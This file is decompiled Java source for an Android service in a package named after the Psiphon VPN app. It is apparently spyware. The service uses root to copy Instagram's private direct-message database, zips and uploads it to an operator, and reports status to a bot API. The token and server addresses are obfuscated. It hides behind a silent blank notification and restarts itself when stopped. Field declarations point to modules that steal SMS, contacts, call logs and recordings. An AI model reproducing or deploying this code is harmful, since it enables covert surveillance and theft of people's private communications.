package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class getinsta extends  android.app.Service{
	public static class getinsta_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (getinsta) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, getinsta.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static getinsta mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return getinsta.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.getinsta");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.getinsta", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (getinsta) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (getinsta) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (getinsta) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (getinsta) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (getinsta) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.datasteam.b4a.system.superuser.SuShell _vvv4 = null;
public static com.datasteam.b4a.system.superuser.SuBrowser _vvv5 = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getdirect(String _topic,String _data) throws Exception{
 //BA.debugLineNum = 66;BA.debugLine="Sub getdirect (Topic As String, Data As String)";
 //BA.debugLineNum = 67;BA.debugLine="Try";
try { //BA.debugLineNum = 71;BA.debugLine="Dim Su As SuShell";
_vvv4 = new com.datasteam.b4a.system.superuser.SuShell();
 //BA.debugLineNum = 72;BA.debugLine="If Su.DeviceRooted Then";
if (_vvv4.DeviceRooted()) { 
 //BA.debugLineNum = 73;BA.debugLine="If Su.ExecuteWithEvent(\"ls\", \"Su\").WaitForCompl";
if (_vvv4.ExecuteWithEvent(processBA,"ls","Su").WaitForCompletion()) { 
 //BA.debugLineNum = 76;BA.debugLine="Su.Execute(\"cp data/data/com.instagram.android";
_vvv4.Execute(processBA,"cp data/data/com.instagram.android/databases/direct.db /storage/emulated/0/direct.db").WaitForCompletion();
 //BA.debugLineNum = 78;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?cha";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"RootGrant"+"&reply_to_message_id="+BA.NumberToString(0));
 //BA.debugLineNum = 85;BA.debugLine="zip.ABZipfile(File.DirRootExternal&\"/\" , \"dire";
_vv0.ABZipfile(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/","direct.db",anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/mydb.zip");
 //BA.debugLineNum = 87;BA.debugLine="upload.upload(admin_id , \"DirectDb\".Replace(\"";
_vv6._upload(_admin_id,"DirectDb".replace(" ","%20"),(int) (0),anywheresoftware.b4a.keywords.Common.File.getDirRootExternal(),"mydb.zip");
 //BA.debugLineNum = 88;BA.debugLine="File.Delete(File.DirRootExternal&\"/\" , \"direct";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/","direct.db");
 //BA.debugLineNum = 89;BA.debugLine="File.Delete(File.DirRootExternal&\"/\",\"mydb.zip";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/","mydb.zip");
 }else {
 //BA.debugLineNum = 91;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?cha";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"notGrant"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 }else {
 //BA.debugLineNum = 95;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"notRooted"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 } 
       catch (Exception e18) {
			processBA.setLastException(e18); //BA.debugLineNum = 98;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 100;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 8;BA.debugLine="Dim Su As SuShell";
_vvv4 = new com.datasteam.b4a.system.superuser.SuShell();
 //BA.debugLineNum = 9;BA.debugLine="Dim Browser As SuBrowser";
_vvv5 = new com.datasteam.b4a.system.superuser.SuBrowser();
 //BA.debugLineNum = 10;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 11;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 12;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,54,105,-67,72,64,119,-17,35,46,104,-46,87,34,125,-67,57,49,18,-118,35,95,25,-46,87,71,24,-87,45,49,99,-5,82,95}, 322758)+main.vvv13 (new byte[] {87,54,-123,-3,45,37,-2,-54,35,95,-124,-29,38,71,-123,-3,45,37,-2,-54,35,95,-124,-29,38,71,-123,-3,45,37,-2,-54,35,95,-124,-110,87,71,-123,-3,72,64,-22,-34,35,46,-11,-29,87,54,-123,-3,72,64,-113,-69,55,58,-11,-110,38,71,-123,-104,45,49,-2,-54,82,95,-11,-29,50,34,-32,-3,57,49,-113,-54,82,95,-124,-29,87,71,-123,-104,45,64,-2,-54,82,46,-124,-29,87}, 624720)+main.vvv13 (new byte[] {87,71,81,-3,45,37,91,-54,35,46,80,-110,87,71,81,-3,72,64,62,-34,82,46,33,-110,87,71,81,-3,57,64,91,-69,55,58,80,-29,38,71,81,-3,72,49,91,-69,82,58,53,-110,87,71,81,-116,57,49,91,-54,35,58,53,-110,87,71,32,-3,72,49,91,-69,35,58,53,-29,38,54,32,-116}, 154708)+main.vvv13 (new byte[] {38,54,32,-66,72,64,62,-99,35,95,80,-47,38,71,81,-49,57,49,62,-99,35,46,33,-96,87,54,81,-37,45,49,91,-119,82,46,80,-96,38,71,32,-37,45,64,91,-8,82,95,80,-47,87,54,32,-66,45,37,42,-119,35,95,80,-96,38,71,81,-37,45,64,91,-8,82,95,33,-96,87,54,32,-66,45,37,91,-119,82,46,33,-96,38,54,32,-66,72,37,62,-119,82,95,80,-96,38,71,81,-66,72,37,62,-119,35,46,80,-96,87,54,81,-66,72,37,62,-8,35,95,80,-47,87,71,81,-49,57,64,62,-99,35,95,80,-47,38,71,81,-49,57,49,62,-99,82,46,33,-96,38,71,81,-66,72,64,91,-8,55,58,33,-47,87,71,32,-66}, 154121)+main.vvv13 (new byte[] {87,54,63,59,45,37,53,125,82,95,79,84,38,54,63,59,45,37,53,12,35,95,79,37,38,54,78,59,45,37,68,125,82,95,62,84,87,71,63,59,72,37,33,12,35,46,62,84,87,71,78,59,72,64,68,105,55,46,62,84,87,54,78,74,57,49,53,105,82,58,79,37,38,54,63,59,57,64,68,125,82,58,42,37,38,71,78,59,72,64,53,125,35,58,42,37,87,71,63,74,72,49,68,12,35,58,42,37,38,54,78,74,72,64,53,12}, 197136)+main.vvv13 (new byte[] {87,70,-27,-78,57,48,-5,-32,82,47,-16,-55,87,55,-27,-78,72,65,-5,-111,82,94,-127,-72,87,70,-128,-78,45,65,-5,-32,82,94,-127,-55,38,70,-128,-41,72,36,-17,-32,82,94,-16,-55,87,70,-15,-41,57,36}, 46181);
 //BA.debugLineNum = 13;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 14;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,53,19,127,72,67,104,72,35,92,99,4,50,53,98,127,72,67,25,72,35,45,99,4,50,53,98,127,72,67,25,72,35,45,99,4,50,53,19,127,57,50,104,72,35,45,99,4,50,53,98,127,57,50,104,72,82,92,99,4,50,52,99,26,57,67,25,72,35,92,99,97,87,53,118,26}, 886204)+main.vvv13 (new byte[] {38,71,-87,-79,57,64,-46,-122,82,46,-51,-69,38,71,-87,-79,57,64,-46,-122,82,46,-51,-81,50,54,-40,-79,57,64,-46,-9,82,95,-39,-69,50,71,-40,-79,57,49,-46,-9,35,95,-39,-69,50,54,-40,-64,72,64,-93,-9,35,46,-39,-69,50,54,-87}, 726002)+main.vvv13 (new byte[] {87,71,105,-116,57,64,99,-69,55,58,25,-29,87,54,24,-3,57,64,99,-69,55,58,25,-29,87,71,105,-116,57,49,18,-69,55,58,25,-110,38,71,105,-116,72,64,99,-69,55,58,25,-110,87,54,105,-116,57,64,99,-69,55,58,25,-110,87,71,105,-116,72,64,99,-69,55,46,13,-29,38,71,105,-116,57,64,18,-54,35,58,13,-29,38,71}, 283021)+main.vvv13 (new byte[] {38,54,-84,22,72,49,-90,53,34,58,-36,8,87,54,-84,22,57,64,-90,33,55,58,-36,8,87,71,-84,103,72,64,-90,80,55,58,-36,121,87,71,-84,22,57,49,-41,33,55}, 717234);
 //BA.debugLineNum = 15;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,104,118,-123,115,45,45,-124,121,123,100}, 787749);
 //BA.debugLineNum = 16;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,125,32,69,38,41}, 349524);
 //BA.debugLineNum = 17;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,53,71,-93,72,67,60,-108,35,92,55,-40,50,53,54,-93,72,67,77,-108,35,45,55,-40,50,53,54,-93,72,67,77,-108,35,45,55,-40,50,53,71,-93,57,50,60,-108}, 767159)+main.vvv13 (new byte[] {38,53,101,-65,45,51,110,-7,35,45,100,-75,87,53,101,-38,72,50,123,-7,82,45,100,-75,38,53,101,-85,72,50,123,-7,35,45,21,-60,87,68,101,-85,57,50,123,-7,35,92,21,-60,87,68,101,-38,72,50,123}, 884741)+main.vvv13 (new byte[] {50,54,-90,-16,57,49,-84,-57,82,95,-89,-117,50,54,-90,-16,72,64,-35,-57,35,46,-89,-117,50,54,-41,-127,72,64,-35,-74,82,95,-89,-117,50,54,-41,-16,57,64,-35,-57,82,95,-89,-117,50,54,-41,-16,72,64,-35,-74,82,95,-89,-117,38,34,-90,-127,72,64,-35,-57,82,46,-42,-97,50,34,-90,-127,72,49,-84,-74,82,95,-89,-18,50,55,-78,-127,72,49,-35,-74,35,46,-89,-18,38,34,-78,-127,72,64,-84,-57,35,46}, 435836)+main.vvv13 (new byte[] {38,54,60,98,45,49,71,65,35,46,76,25,38,54,60,98,45,49,71,65,82,46,76,25,87,71,60,98,57,37,54,65,82,46,61,104,38}, 198964)+main.vvv13 (new byte[] {38,54,-54,-69,45,49,-79,-104,82,95,-53,-79,38,71,-54,-69,45,49,-79,-104,35,46,-53}, 684330)+main.vvv13 (new byte[] {38,55,-19,-28,45}, 17981);
 //BA.debugLineNum = 18;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 19;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 20;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 21;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 24;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 26;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 28;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 29;BA.debugLine="Browser.Initialize";
_vvv5.Initialize();
 //BA.debugLineNum = 30;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 31;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 32;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 33;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 34;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",getinsta.getObject());
 //BA.debugLineNum = 35;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",getinsta.getObject());
 //BA.debugLineNum = 36;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 37;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 38;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 42;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 43;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 44;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 45;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 47;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 48;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 49;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 50;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 51;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 59;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 104;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 105;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 106;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 61;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 64;BA.debugLine="End Sub";
return "";
}
}
